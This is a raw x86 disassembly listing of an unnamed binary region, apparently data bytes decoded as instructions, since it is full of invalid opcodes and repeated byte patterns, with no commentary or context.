  41ad2b:	fild   QWORD PTR [esi]
  41ad2d:	xor    bh,bh
  41ad2f:	or     al,0x6f
  41ad31:	test   edi,edi
  41ad33:	and    eax,DWORD PTR [edi+0x31ece88e]
  41ad39:	je     0x41ad23
  41ad3b:	or     al,0x6c
  41ad3d:	cmp    DWORD PTR [edi],esp
  41ad3f:	in     eax,dx
  41ad40:	sbb    al,0x48
  41ad42:	mov    edi,0xbf746c0c
  41ad47:	and    BYTE PTR [ebx-0x53f3408c],bh
  41ad4d:	je     0x41ad55
  41ad4f:	jmp    0x41ad50
  41ad51:	xor    DWORD PTR [edi+0x874870c],edi
  41ad57:	out    dx,al
  41ad58:	hlt    
  41ad59:	(bad)
  41ad5d:	aaa    
  41ad5e:	(bad)  [ebx]
  41ad60:	xchg   ebx,eax
  41ad61:	je     0x41ad62
  41ad63:	and    BYTE PTR [esp+esi*2+0x746c23df],bl
  41ad6a:	jmp    DWORD PTR ds:0x2401456f
  41ad70:	ins    BYTE PTR es:[edi],dx
  41ad71:	je     0x41ad52
  41ad73:	(bad)  
	...
  41ad88:	stos   DWORD PTR es:[edi],eax
  41ad89:	aaa    
  41ad8a:	retf   
  41ad8b:	out    0x5c,eax
  41ad8d:	xchg   ch,dh
  41ad8f:	fbstp  TBYTE PTR [edi-0x73fc20d0]
  41ad95:	xchg   esp,eax
  41ad96:	fild   WORD PTR [ebx]
  41ad98:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41ad9f:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  41ada6:	fild   WORD PTR [ebx]
  41ada8:	mov    WORD PTR [eax+ecx*1+0x8948fe9],ss
  41adaf:	jmp    0xe94a4243
  41adb4:	(bad)  
  41adb5:	xchg   esp,eax
  41adb6:	or     cl,ch
  41adb8:	(bad)  
  41adb9:	xchg   esp,eax
  41adba:	or     cl,ch
  41adbc:	(bad)  
  41adbd:	xchg   esp,eax
  41adbe:	or     cl,ch
  41adc0:	(bad)  
  41adc1:	xchg   esp,eax
  41adc2:	or     cl,ch
  41adc4:	(bad)  
  41adc5:	xchg   esp,eax
  41adc6:	or     cl,ch
  41adc8:	(bad)  
  41adc9:	xchg   esp,eax
  41adca:	or     cl,ch
  41adcc:	(bad)  
  41adcd:	xchg   esp,eax
  41adce:	or     cl,ch
  41add0:	(bad)  
  41add1:	xchg   esp,eax
  41add2:	or     cl,ch
  41add4:	(bad)  
  41add5:	xchg   esp,eax
  41add6:	or     cl,ch
  41add8:	(bad)  
  41add9:	xchg   esp,eax
  41adda:	or     cl,ch
  41addc:	(bad)  
  41addd:	xchg   esp,eax
  41adde:	or     cl,ch
  41ade0:	(bad)  
  41ade1:	xchg   esp,eax
  41ade2:	or     cl,ch
  41ade4:	(bad)  
  41ade5:	xchg   esp,eax
  41ade6:	or     cl,ch
  41ade8:	(bad)  
  41ade9:	xchg   esp,eax
  41adea:	or     cl,ch
	...
  41ae00:	(bad)  
  41ae01:	xchg   esp,eax
  41ae02:	or     cl,ch
  41ae04:	(bad)  
  41ae05:	xchg   esp,eax
  41ae06:	or     cl,ch
  41ae08:	(bad)  
  41ae09:	xchg   esp,eax
  41ae0a:	or     cl,ch
  41ae0c:	(bad)  
  41ae0d:	xchg   esp,eax
  41ae0e:	or     cl,ch
  41ae10:	(bad)  
  41ae11:	xchg   esp,eax
  41ae12:	or     cl,ch
  41ae14:	(bad)  
  41ae15:	xchg   esp,eax
  41ae16:	or     cl,ch
  41ae18:	(bad)  
  41ae19:	xchg   esp,eax
  41ae1a:	or     cl,ch
  41ae1c:	(bad)  
  41ae1d:	xchg   esp,eax
  41ae1e:	or     cl,ch
  41ae20:	(bad)  
  41ae21:	xchg   esp,eax
  41ae22:	or     cl,ch
  41ae24:	(bad)  
  41ae25:	xchg   esp,eax
  41ae26:	or     cl,ch
  41ae28:	(bad)  
  41ae29:	xchg   esp,eax
  41ae2a:	or     cl,ch
  41ae2c:	(bad)  
  41ae2d:	xchg   esp,eax
  41ae2e:	or     cl,ch
  41ae30:	(bad)  
  41ae31:	xchg   esp,eax
  41ae32:	or     cl,ch
  41ae34:	(bad)  
  41ae35:	xchg   esp,eax
  41ae36:	or     BYTE PTR [eax],al
  41ae38:	in     eax,0x94
  41ae3a:	or     BYTE PTR [eax],al
  41ae3c:	in     eax,0x94
  41ae3e:	or     BYTE PTR [eax],al
  41ae40:	cmc    
  41ae41:	xchg   esp,eax
  41ae42:	or     BYTE PTR [eax],al
  41ae44:	cmc    
  41ae45:	xchg   esp,eax
  41ae46:	or     BYTE PTR [eax],al
  41ae48:	in     eax,0x94
  41ae4a:	or     BYTE PTR [eax],al
  41ae4c:	in     eax,0x94
  41ae4e:	or     BYTE PTR [eax],al
  41ae50:	mov    ch,0x94
  41ae52:	or     BYTE PTR [eax],al
  41ae54:	mov    ch,0x94
  41ae56:	or     BYTE PTR [eax],al
  41ae58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae59:	xchg   esp,eax
  41ae5a:	or     BYTE PTR [eax],al
  41ae5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae5d:	xchg   esp,eax
  41ae5e:	or     BYTE PTR [eax],al
  41ae60:	mov    ch,0x94
  41ae62:	or     BYTE PTR [eax],al
	...
  41ae78:	mov    ch,0x94
  41ae7a:	or     BYTE PTR [eax],al
  41ae7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae7d:	xchg   esp,eax
  41ae7e:	or     BYTE PTR [eax],al
  41ae80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae81:	xchg   esp,eax
  41ae82:	or     BYTE PTR [eax],al
  41ae84:	jne    0x41ae1a
  41ae86:	or     BYTE PTR [eax],al
  41ae88:	jne    0x41ae1e
  41ae8a:	or     BYTE PTR [eax],al
  41ae8c:	gs xchg esp,eax
  41ae8e:	or     BYTE PTR [eax],al
  41ae90:	gs xchg esp,eax
  41ae92:	or     BYTE PTR [eax],al
  41ae94:	jne    0x41ae2a
  41ae96:	or     BYTE PTR [eax],al
  41ae98:	jne    0x41ae2e
  41ae9a:	or     BYTE PTR [eax],al
  41ae9c:	gs xchg esp,eax
  41ae9e:	or     BYTE PTR [eax],al
  41aea0:	gs xchg esp,eax
  41aea2:	or     BYTE PTR [eax],al
  41aea4:	xor    eax,0x35000894
  41aea9:	xchg   esp,eax
  41aeaa:	or     BYTE PTR [eax],al
  41aeac:	and    eax,0x25000894
  41aeb1:	xchg   esp,eax
  41aeb2:	or     BYTE PTR [eax],al
  41aeb4:	xor    eax,0x35000894
  41aeb9:	xchg   esp,eax
  41aeba:	or     BYTE PTR [eax],al
  41aebc:	and    eax,0x25000894
  41aec1:	xchg   esp,eax
  41aec2:	or     BYTE PTR [eax],al
  41aec4:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aeca:	or     BYTE PTR [eax],al
  41aecc:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aed2:	or     BYTE PTR [eax],al
  41aed4:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aeda:	or     BYTE PTR [eax],al
	...
  41aef0:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aef6:	or     BYTE PTR [eax],al
  41aef8:	mov    WORD PTR [ebp-0x5273fff8],gs
  41aefe:	or     BYTE PTR [eax],al
  41af00:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af06:	or     BYTE PTR [eax],al
  41af08:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af0e:	or     BYTE PTR [eax],al
  41af10:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af16:	or     BYTE PTR [eax],al
  41af18:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af1e:	or     BYTE PTR [eax],al
  41af20:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af26:	or     BYTE PTR [eax],al
  41af28:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af2e:	or     BYTE PTR [eax],al
  41af30:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af36:	or     BYTE PTR [eax],al
  41af38:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af3e:	or     BYTE PTR [eax],al
  41af40:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af46:	or     BYTE PTR [eax],al
  41af48:	mov    WORD PTR [ebp-0x5273fff8],gs
  41af4e:	or     BYTE PTR [eax],al
  41af50:	mov    WORD PTR [edi+ebx*8+0x3],ss
	...
  41af67:	add    BYTE PTR [esp+edx*4+0x374f24e0],cl
  41af6e:	push   0x4aed7ac
  41af73:	aaa    
  41af74:	ss sbb al,0x75
  41af77:	scas   eax,DWORD PTR es:[edi]
  41af78:	mov    ebp,0xd7ac78a4
  41af7d:	scas   al,BYTE PTR es:[edi]
  41af7e:	fbld   TBYTE PTR [edi+ecx*2]
  41af81:	aaa    
  41af82:	pop    edi
  41af83:	add    ecx,DWORD PTR [esp+edx*4-0x1]
  41af87:	add    edi,DWORD PTR [esp+edx*4-0x9]
  41af8b:	add    edx,DWORD PTR [eax-0x3cfc1e6c]
  41af91:	mov    esi,0x940c03de
  41af96:	fild   WORD PTR [ebx]
  41af98:	dec    esp
  41af99:	xchg   esp,eax
  41af9a:	fild   WORD PTR [ebx]
  41af9c:	ins    BYTE PTR es:[edi],dx
  41af9d:	xchg   esp,eax
  41af9e:	fild   WORD PTR [ebx]
  41afa0:	jl     0x41af36
  41afa2:	fild   WORD PTR [ebx]
  41afa4:	test   BYTE PTR [edi+ebx*8-0x206b77fd],dl
  41afab:	add    ecx,DWORD PTR [esi-0x7cfc206c]
  41afb1:	mov    esi,0x948c83de
  41afb6:	ffreep st(3)
  41afb8:	jae    0x41af78
  41afba:	fisub  WORD PTR [ebx]
  41afbc:	mov    WORD PTR [edi+ebx*8-0x21419c0d],ss
  41afc3:	or     ecx,DWORD PTR [esp+edx*4-0x41ac0021]
  41afca:	fiadd  WORD PTR [ecx]
	...
  41afe0:	mov    WORD PTR [edi+ebx*8+0x5f948c04],ss
  41afe7:	add    al,0x8c
  41afe9:	xchg   esp,eax
  41afea:	lahf   
  41afeb:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc01]
  41aff2:	or     cl,bl
  41aff4:	(bad)  
  41aff5:	xchg   esp,eax
  41aff6:	or     cl,ah
  41aff8:	(bad)  
  41aff9:	xchg   esp,eax
  41affa:	or     ch,ch
  41affc:	(bad)  
  41affd:	xchg   esp,eax
  41affe:	or     bl,ch
  41b000:	(bad)  
  41b001:	xchg   esp,eax
  41b002:	or     al,ch
  41b004:	(bad)  
  41b005:	xchg   esp,eax
  41b006:	or     cl,dl
  41b008:	lahf   
  41b009:	ins    BYTE PTR es:[edi],dx
  41b00a:	sub    cl,ah
  41b00c:	call   DWORD PTR [ebp+0x7580c008]
  41b012:	daa    
  41b013:	rcr    al,1
  41b015:	xchg   esi,eax
  41b016:	pop    es
  41b017:	mov    bl,0x7d
  41b019:	push   0x2a
  41b01b:	add    ebx,esi
  41b01d:	mov    ecx,DWORD PTR [edx]
  41b01f:	and    bl,BYTE PTR [edi-0x6de8d695]
  41b025:	outs   dx,BYTE PTR ds:[esi]
  41b026:	cs out dx,eax
  41b028:	test   eax,0x9d040e8f
  41b02d:	imul   ebp,DWORD PTR [ebx],0xb8a9cdc
  41b033:	cmc    
  41b034:	xchg   ebx,eax
  41b035:	jo     0x41b063
  41b037:	int    0xab
  41b039:	mov    DWORD PTR [edx+eax*1],ecx
  41b03c:	lahf   
  41b03d:	mov    WORD PTR [ecx],cs
  41b03f:	call   0xe15048d1
	...
  41b058:	xchg   ebp,eax
  41b059:	nop
  41b05a:	push   es
  41b05b:	fiadd  WORD PTR [eax+0x70de1ba4]
  41b061:	pushf  
  41b062:	adc    al,0xec
  41b064:	pop    edi
  41b065:	mov    ebx,DWORD PTR ds:0x119363e9
  41b06b:	fisttp WORD PTR [eax+ebp*4-0x73a20101]
  41b072:	or     DWORD PTR [eax],eax
  41b074:	dec    ebx
  41b075:	nop
  41b076:	push   cs
  41b077:	xrelease mov DWORD PTR ds:[edi],eax
  41b07b:	add    DWORD PTR [edi-0x64ffd362],ebx
  41b081:	mov    ss,WORD PTR [ecx]
  41b083:	daa    
  41b084:	daa    
  41b085:	jne    0x41b0af
  41b087:	das    
  41b088:	mov    gs,WORD PTR [eax-0x5b7bc8d2]
  41b08e:	and    DWORD PTR [ecx],ebp
  41b090:	xor    al,0x72
  41b092:	adc    al,0x1f
  41b094:	cmc    
  41b095:	mov    esp,0x90f500f5
  41b09a:	or     BYTE PTR [eax],al
  41b09c:	in     eax,0x90
  41b09e:	cmc    
  41b09f:	jmp    ecx
  41b0a1:	mov    esp,0x90f100f5
  41b0a6:	cmc    
  41b0a7:	add    cl,dh
  41b0a9:	mov    esp,0x90f1fff5
  41b0ae:	or     BYTE PTR [eax],al
  41b0b0:	in     eax,0x90
  41b0b2:	cmc    
  41b0b3:	push   DWORD PTR [ebp-0x4a000b44]
  41b0b9:	mov    esp,0xf5
	...
  41b0ce:	add    BYTE PTR [eax],al
  41b0d0:	mov    cl,0xbc
  41b0d2:	cmc    
  41b0d3:	add    BYTE PTR [ebp-0x4e000b44],ah
  41b0d9:	mov    esp,0x90b100f4
  41b0de:	cmc    
  41b0df:	add    BYTE PTR [ebp-0x5efef770],ah
  41b0e5:	nop
  41b0e6:	or     BYTE PTR [eax],al
  41b0e8:	jno    0x41b0a6
  41b0ea:	hlt    
  41b0eb:	push   DWORD PTR [ebp-0x44]
  41b0ee:	hlt    
  41b0ef:	add    BYTE PTR [ebp-0x44],ah
  41b0f2:	hlt    
  41b0f3:	add    BYTE PTR [ebp-0x44],ah
  41b0f6:	cmc    
  41b0f7:	push   DWORD PTR [ebp-0x44]
  41b0fa:	cmc    
  41b0fb:	push   DWORD PTR [ebp-0x68]
  41b0fe:	cmc    
  41b0ff:	add    BYTE PTR [ebp-0x68],ah
  41b102:	cmc    
  41b103:	add    BYTE PTR [ecx-0x44],ah
  41b106:	hlt    
  41b107:	add    BYTE PTR [ecx],dh
  41b109:	cwde   
  41b10a:	cmc    
  41b10b:	dec    DWORD PTR [ecx+ebp*4-0x4e72fff8]
  41b112:	or     BYTE PTR [eax],al
  41b114:	lea    ebp,[ecx-0x51d400f8]
  41b11a:	or     BYTE PTR [eax],al
  41b11c:	mov    WORD PTR [ecx-0x4de4000c],gs
  41b122:	hlt    
  41b123:	(bad)  
  41b124:	adc    ebp,DWORD PTR [esi-0x5272fff8]
  41b12a:	or     bh,bh
  41b12c:	add    ebp,DWORD PTR [edx-0x4e73010c]
  41b132:	or     BYTE PTR [eax],al
	...
  41b148:	mov    WORD PTR [ebp-0x527300f8],gs
  41b14e:	hlt    
  41b14f:	dec    BYTE PTR [ebp+ebp*4-0x5272fff8]
  41b156:	or     BYTE PTR [eax],al
  41b158:	lea    ebp,[ebp-0x4e34000c]
  41b15e:	or     bh,bh
  41b160:	mov    WORD PTR [ebp-0x524400f8],gs
  41b166:	hlt    
  41b167:	(bad)  
  41b168:	mov    bl,0xa9
  41b16a:	or     BYTE PTR [eax],al
  41b16c:	lea    ebp,[ebp-0x565c000c]
  41b172:	or     BYTE PTR [eax],al
  41b174:	mov    WORD PTR [ecx-0x5673000c],?
  41b17a:	hlt    
  41b17b:	dec    BYTE PTR [ebx-0x73010b4f]
  41b181:	test   eax,0xad7bff08
  41b186:	or     bh,bh
  41b188:	mov    WORD PTR [ecx-0x4e73000c],gs
  41b18e:	or     BYTE PTR [eax],al
  41b190:	lea    ebp,[ecx-0x4ea4000c]
  41b196:	hlt    
  41b197:	(bad)  
  41b198:	push   ebx
  41b199:	xchg   esp,eax
  41b19a:	(bad)  
  41b19c:	dec    edx
  41b19d:	xchg   esp,eax
  41b19e:	jmp    0x41b19f
  41b1a0:	inc    ebx
  41b1a1:	mov    ebx,0x943bffde
  41b1a6:	(bad)  
  41b1a8:	xor    edx,DWORD PTR [edi+ebx*8+0x3]
	...
  41b1bf:	add    BYTE PTR [esp+edx*4-0x44dcfc15],cl
  41b1c6:	fdivp  st(7),st
  41b1c8:	sbb    bh,BYTE PTR [ebx-0x6b73fc22]
  41b1ce:	jecxz  0x41b1d3
  41b1d0:	or     edx,DWORD PTR [edi+edi*4-0x20eb637d]
  41b1d7:	or     DWORD PTR [esp+edx*1-0x6b737c21],0xffffffbf
  41b1df:	cmp    DWORD PTR [esp+edx*4-0x21],0x3
  41b1e4:	jl     0x41b17a
  41b1e6:	mov    edi,0xbf948c03
  41b1eb:	add    edi,DWORD PTR [esp+edx*1-0x1]
  41b1ef:	or     DWORD PTR [esp+edx*1+0x148c03ff],0xffffffff
  41b1f7:	sbb    DWORD PTR [esp+edx*1+0x149c83df],0xffffffdf
  41b1ff:	add    ecx,DWORD PTR [esp+edx*1+0x148c83df]
  41b206:	fild   WORD PTR [ebx]
  41b208:	jl     0x41b19e
  41b20a:	inc    DWORD PTR [ebx]
  41b20c:	mov    WORD PTR [edi+edi*4-0x20eb63fd],ss
  41b213:	sbb    DWORD PTR [esp+edx*4-0x6b63fc41],0xffffffbf
  41b21b:	or     DWORD PTR [esp+edx*1-0x6b73fc21],0xffffffdf
  41b223:	add    eax,DWORD PTR [eax]
	...
  41b235:	add    BYTE PTR [eax],al
  41b237:	add    BYTE PTR [esp+edx*1-0x6af016f8],cl
  41b23e:	or     cl,cl
  41b240:	shld   DWORD PTR [eax],ecx,cl
  41b243:	jmp    0x9ca56d7
  41b248:	mov    BYTE PTR [eax+ecx*1-0x776b6ff7],ah
  41b24f:	jmp    0xe94a46e3
  41b254:	shld   DWORD PTR [eax],ecx,cl
  41b257:	or     DWORD PTR [eax],ecx
  41b259:	xchg   ebp,eax
  41b25a:	or     cl,ch
  41b25c:	shld   DWORD PTR [eax-0x775b7017],ecx,cl
  41b263:	leave  
  41b264:	setne  BYTE PTR [eax]
  41b267:	jmp    0xc94a46fb
  41b26c:	shld   DWORD PTR [eax],ecx,cl
  41b26f:	leave  
  41b270:	(bad)  
  41b271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b272:	mov    cl,ch
  41b274:	(bad)  
  41b275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b276:	or     cl,cl
  41b278:	setne  BYTE PTR [eax-0x775b7017]
  41b27f:	jmp    0xe9ca5793
  41b284:	setne  BYTE PTR [eax]
  41b287:	jmp    0xe9ca571b
  41b28c:	setne  BYTE PTR [eax+0x8948809]
  41b293:	or     DWORD PTR [eax],edx
  41b295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b296:	mov    BYTE PTR [ecx],cl
  41b298:	or     BYTE PTR [ebp+0x908],ah
	...
  41b2ae:	add    BYTE PTR [eax],al
  41b2b0:	nop
  41b2b1:	xchg   esp,eax
  41b2b2:	or     cl,ch
  41b2b4:	setne  BYTE PTR [eax]
  41b2b7:	jmp    0xc9ca474b
  41b2bc:	sete   BYTE PTR [eax]
  41b2bf:	jmp    0xe9ca56d3
  41b2c4:	(bad)  
  41b2c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2c6:	or     BYTE PTR [eax],al
  41b2c8:	push   ebp
  41b2c9:	xchg   ebp,eax
  41b2ca:	or     BYTE PTR [eax+0x189555],al
  41b2d0:	inc    ebp
  41b2d1:	adc    eax,0x95458008
  41b2d6:	or     BYTE PTR [eax+0x189095],al
  41b2dc:	xor    eax,0x25001815
  41b2e1:	xchg   ebp,eax
  41b2e2:	or     BYTE PTR [eax],al
  41b2e4:	and    eax,0x95800815
  41b2e9:	adc    BYTE PTR [eax],cl
  41b2eb:	add    BYTE PTR ds:0x85800895,dh
  41b2f1:	nop
  41b2f2:	sbb    BYTE PTR [eax-0x7fe7ef7b],al
  41b2f8:	cmc    
  41b2f9:	adc    al,0x18
  41b2fb:	add    ch,bh
  41b2fd:	mov    cs,WORD PTR [eax]
  41b2ff:	add    ch,ah
  41b301:	mov    cs,WORD PTR [edx]
  41b303:	or     ch,ah
  41b305:	xchg   esp,eax
  41b306:	or     BYTE PTR [eax],al
  41b308:	fst    QWORD PTR [edx+ecx*1+0x88ef508]
  41b30f:	or     ch,ah
  41b311:	xchg   esp,eax
  41b312:	or     BYTE PTR [eax],al
	...
  41b328:	in     eax,dx
  41b329:	mov    cs,WORD PTR [edx]
  41b32b:	add    BYTE PTR [ebp-0x42f7f772],dh
  41b331:	xchg   esp,eax
  41b332:	or     al,BYTE PTR [eax]
  41b334:	lods   eax,DWORD PTR ds:[esi]
  41b335:	xchg   esp,eax
  41b336:	or     BYTE PTR [eax],cl
  41b338:	lods   eax,DWORD PTR ds:[esi]
  41b339:	xchg   esp,eax
  41b33a:	or     BYTE PTR [eax],cl
  41b33c:	mov    ch,0x94
  41b33e:	or     al,BYTE PTR [eax]
  41b340:	popf   
  41b341:	mov    cs,WORD PTR [edx]
  41b343:	or     BYTE PTR [ebp-0x5afff56c],ch
  41b349:	xchg   esp,eax
  41b34a:	or     cl,BYTE PTR [eax]
  41b34c:	jge    0x41b2e0
  41b34e:	or     BYTE PTR [eax],al
  41b350:	jne    0x41b2e6
  41b352:	or     BYTE PTR [eax],cl
  41b354:	mov    WORD PTR [ebp-0x5273fff8],?
  41b35a:	or     al,BYTE PTR [edx]
  41b35c:	xchg   esp,eax
  41b35d:	lods   eax,DWORD PTR ds:[esi]
  41b35e:	or     al,BYTE PTR [eax]
  41b360:	mov    WORD PTR [ebp-0x5273fdf6],gs
  41b366:	or     BYTE PTR [edx],al
  41b368:	test   BYTE PTR [ebp-0x3a6bfdf8],dh
  41b36e:	or     al,BYTE PTR [edx]
  41b370:	mov    ebp,es
  41b372:	or     al,BYTE PTR [eax]
  41b374:	test   BYTE PTR [ebp-0x5273fdf6],ch
  41b37a:	or     BYTE PTR [edx],al
  41b37c:	mov    ebp,es
  41b37e:	or     al,BYTE PTR [eax]
  41b380:	xchg   esp,eax
  41b381:	lds    ecx,FWORD PTR [eax]
  41b383:	add    BYTE PTR [ebp+esi*4-0x527bfdf6],cl
  41b38a:	or     al,BYTE PTR [eax]
	...
  41b3a0:	mov    WORD PTR [ebp-0x526bfff8],gs
  41b3a6:	or     al,BYTE PTR [edx]
  41b3a8:	test   BYTE PTR [ebp-0x4a7bfff8],ch
  41b3ae:	or     BYTE PTR [edx],al
  41b3b0:	mov    ebp,es
  41b3b2:	or     al,BYTE PTR [eax]
  41b3b4:	mov    WORD PTR [ebp-0x5273fdf8],gs
  41b3ba:	or     al,BYTE PTR [edx]
  41b3bc:	test   BYTE PTR [ebp-0x526bfff6],ch
  41b3c2:	or     BYTE PTR [eax],al
  41b3c4:	mov    WORD PTR [ebp-0x4a73fff6],gs
  41b3ca:	or     BYTE PTR [edx],al
  41b3cc:	mov    WORD PTR [ebp-0x526bfdf6],?
  41b3d2:	or     al,BYTE PTR [eax]
  41b3d4:	xchg   esp,eax
  41b3d5:	lds    ecx,FWORD PTR [eax]
  41b3d7:	add    BYTE PTR [ebp+ebp*4-0x5273fff6],al
  41b3de:	or     BYTE PTR [eax],al
  41b3e0:	mov    WORD PTR [edi+esi*8-0x87371fd],ss
  41b3e7:	add    eax,0x3df8c8c
  41b3ec:	mov    ss,WORD PTR [edi+ebx*8-0x87373fd]
  41b3f3:	add    eax,0x3f78c8e
  41b3f8:	mov    WORD PTR [edi+eiz*8-0x206b71fb],ss
  41b3ff:	add    eax,0x3f7948e
	...
  41b418:	mov    WORD PTR [edi+ebx*8-0x187371fd],cs
  41b41f:	add    eax,0x5e78c8c
  41b424:	mov    WORD PTR [edi+ebx*8-0x87371fd],ss
  41b42b:	add    eax,0x3e7948e
  41b430:	mov    WORD PTR [edi+eiz*8-0x207371fd],ss
  41b437:	add    eax,0x23e0948e
  41b43c:	or     al,0x94
  41b43e:	pusha  
  41b43f:	and    ecx,DWORD PTR [esp+edx*4-0x6b73dca0]
  41b446:	pop    edi
  41b447:	add    ecx,DWORD PTR [esp+edx*4-0x6bf3dca1]
  41b44e:	pusha  
  41b44f:	add    ecx,DWORD PTR [esp+edx*4]
  41b452:	loopne 0x41b457
  41b454:	or     al,0x94
  41b456:	loopne 0x41b47b
  41b458:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41b45f:	and    ecx,DWORD PTR [esp+edx*4]
  41b462:	fbld   TBYTE PTR [ebx]
  41b464:	or     al,0x94
  41b466:	pusha  
  41b467:	and    al,0xc
  41b469:	xchg   esp,eax
  41b46a:	pusha  
  41b46b:	add    al,0x8c
  41b46d:	xchg   esp,eax
  41b46e:	or     cl,ch
  41b470:	(bad)  
  41b471:	xchg   esp,eax
  41b472:	or     BYTE PTR [ecx-0x70],ch
  41b475:	adc    al,0x8
  41b477:	call   0xe849c90b
	...
  41b490:	(bad)  
  41b491:	xchg   esp,eax
  41b492:	or     cl,ch
  41b494:	scas   eax,DWORD PTR es:[edi]
  41b495:	xchg   esp,eax
  41b496:	or     cl,ch
  41b498:	(bad)  
  41b499:	adc    al,0x8
  41b49b:	call   0x6949c94f
  41b4a0:	nop
  41b4a1:	xchg   esp,eax
  41b4a2:	or     cl,ch
  41b4a4:	(bad)  
  41b4a5:	adc    al,0x8
  41b4a7:	call   0x694a491b
  41b4ac:	push   0x90680894
  41b4b1:	adc    al,0x8
  41b4b3:	call   0x694a4947
  41b4b8:	jo     0x41b44e
  41b4ba:	or     BYTE PTR [ecx-0x78],ch
  41b4bd:	adc    al,0x8
  41b4bf:	jmp    0x694a4933
  41b4c4:	push   0xb0680814
  41b4c9:	adc    al,0x8
  41b4cb:	push   0x69089488
  41b4d0:	nop
  41b4d1:	adc    al,0x8
  41b4d3:	call   0xe949c967
  41b4d8:	scas   eax,DWORD PTR es:[edi]
  41b4d9:	adc    al,0x8
  41b4db:	push   0x680814a8
  41b4e0:	nop
  41b4e1:	xchg   esp,eax
  41b4e2:	or     cl,ch
  41b4e4:	(bad)  
  41b4e5:	xchg   esp,eax
  41b4e6:	or     cl,ch
  41b4e8:	(bad)  
  41b4e9:	xchg   esp,eax
  41b4ea:	or     cl,ch
  41b4ec:	outs   dx,DWORD PTR ds:[esi]
  41b4ed:	adc    al,0x8
  41b4ef:	imul   ebp,DWORD PTR [edi-0x6c],0x6908
	...
  41b506:	add    BYTE PTR [eax],al
  41b508:	(bad)  
  41b509:	adc    al,0x8
  41b50b:	push   0x8148f
  41b510:	mov    ah,0x91
  41b512:	or     BYTE PTR [eax],al
  41b514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b515:	jno    0x41b49f
  41b517:	add    BYTE PTR [ecx+esi*2],ah
  41b51a:	or     BYTE PTR [eax],al
  41b51c:	hlt    
  41b51d:	jno    0x41b527
  41b51f:	add    ch,dh
  41b521:	xchg   ecx,eax
  41b522:	or     BYTE PTR [eax],al
  41b524:	in     al,0x71
  41b526:	mov    BYTE PTR [eax],al
  41b528:	in     al,0x91
  41b52a:	or     BYTE PTR [eax],al
  41b52c:	je     0x41b4bf
  41b52e:	or     BYTE PTR [eax],al
  41b530:	jne    0x41b5a3
  41b532:	or     BYTE PTR [eax],al
  41b534:	fs xchg ecx,eax
  41b536:	mov    BYTE PTR [eax],al
  41b538:	fs jno 0x41b543
  41b53b:	add    BYTE PTR [ebp-0x4bff778f],dh
  41b541:	xchg   ecx,eax
  41b542:	mov    BYTE PTR [eax],al
  41b544:	and    al,0x71
  41b546:	or     BYTE PTR [eax],al
  41b548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b549:	jno    0x41b553
  41b54b:	add    BYTE PTR ds:0x34008891,dh
  41b551:	jno    0x41b4db
  41b553:	add    BYTE PTR [ebp+0x25000891],ah
  41b559:	xchg   ecx,eax
  41b55a:	mov    BYTE PTR [eax],al
  41b55c:	cmc    
  41b55d:	jo     0x41b567
  41b55f:	add    BYTE PTR [ebp+0x71],dh
  41b562:	mov    BYTE PTR [eax],al
  41b564:	in     eax,0x8f
  41b566:	or     BYTE PTR [eax],al
  41b568:	in     eax,0x8f
  41b56a:	add    BYTE PTR [edx],al
	...
  41b580:	cmc    
  41b581:	nop
  41b582:	add    BYTE PTR [edx],al
  41b584:	cmc    
  41b585:	(bad)
  41b589:	nop
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	in     eax,0x8f
  41b58e:	or     BYTE PTR [eax],al
  41b590:	mov    ch,0x90
  41b592:	or     BYTE PTR [eax-0x4b],al
  41b595:	nop
  41b596:	add    BYTE PTR [edx],al
  41b598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b599:	xchg   ecx,eax
  41b59a:	add    BYTE PTR [eax-0x74],al
  41b59d:	stos   DWORD PTR es:[edi],eax
  41b59e:	or     BYTE PTR [eax],cl
  41b5a0:	mov    WORD PTR [ebx-0x5471fff7],gs
  41b5a6:	or     DWORD PTR [eax],ecx
  41b5a8:	dec    esp
  41b5a9:	stos   DWORD PTR es:[edi],eax
  41b5aa:	or     DWORD PTR [eax],eax
  41b5ac:	dec    esi
  41b5ad:	stos   DWORD PTR es:[edi],eax
  41b5ae:	or     BYTE PTR [eax],cl
  41b5b0:	into   
  41b5b1:	mov    ebp,0xbd8c0809
  41b5b6:	or     BYTE PTR [eax],al
  41b5b8:	int3   
  41b5b9:	mov    ebp,0xbd8e0008
  41b5be:	or     BYTE PTR [eax],cl
  41b5c0:	int3   
  41b5c1:	mov    ebp,0xbdcc0808
  41b5c6:	or     BYTE PTR [eax],al
  41b5c8:	mov    WORD PTR [ebp-0x4233fff7],?
  41b5ce:	or     DWORD PTR [eax],ecx
  41b5d0:	into   
  41b5d1:	mov    ebp,0xbdce0809
  41b5d6:	or     DWORD PTR [eax],eax
  41b5d8:	mov    ?,WORD PTR [ebp-0x4231f7f8]
  41b5de:	or     DWORD PTR [eax],eax
  41b5e0:	int3   
